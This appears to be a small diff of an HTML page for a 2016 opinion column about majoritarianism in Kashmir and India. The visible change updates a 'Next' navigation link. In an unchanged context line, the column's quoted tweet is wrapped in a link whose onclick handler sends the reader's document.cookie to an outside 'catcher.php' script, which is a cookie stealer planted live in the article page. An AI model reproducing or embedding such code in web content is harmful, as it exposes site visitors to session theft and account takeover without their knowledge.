@@ -19,7 +19,7 @@
 
 <p class="details">Minhaz Merchant |Sep 2016 Sat, 17  <a href="#"></a> </p>
 <h2 align="right"><a href="20160916-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160918-opinion.php"> Next </a> </h2>
 <p>
 A simple tweet I sent out recently drew unexpected ire. “Just as <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Muslim majoritarian Kashmir is unacceptable, so is Hindu majoritarian India,”</a> I wrote.
 </p> <p>
